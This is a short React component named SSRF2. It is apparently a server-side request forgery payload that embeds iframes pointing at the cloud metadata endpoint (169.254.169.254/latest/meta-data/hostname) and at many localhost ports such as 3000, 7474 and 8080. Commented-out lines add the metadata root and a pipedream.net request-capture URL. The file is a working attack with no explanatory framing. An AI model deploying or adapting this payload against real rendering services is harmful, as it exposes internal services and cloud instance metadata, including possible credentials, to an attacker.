function SSRF2() {
  return (
    <div className=''>
        {/* <iframe src='https://www.youtube.com/embed/dQw4w9WgXcQ' /> */}
        {/* <iframe className='w-lg h-24' src='http://169.254.169.254' /> */}
        <iframe  className='w-2xl h-96' src='https://salesblink-delta.vercel.app/' />
        {/* <iframe  className='w-2xl h-96' src='http://169.254.169.254/latest/meta-data/' /> */}
        <iframe  className='w-2xl h-96' src='http://169.254.169.254/latest/meta-data/hostname' />
         <iframe className="w-2xl h-96" src="http://127.0.0.1:3000"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:5000"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:5001"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:7000"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:7474"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:8000"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:8001"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:8008"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:8080"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:8081"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:8088"></iframe>
  <iframe className="w-2xl h-96" src="http://127.0.0.1:8090"></iframe>
        {/* <iframe  className='w-2xl h-96' src='https://eo88cq2x5r57ogc.m.pipedream.net' />  */}
    </div>
  )
}

export default SSRF2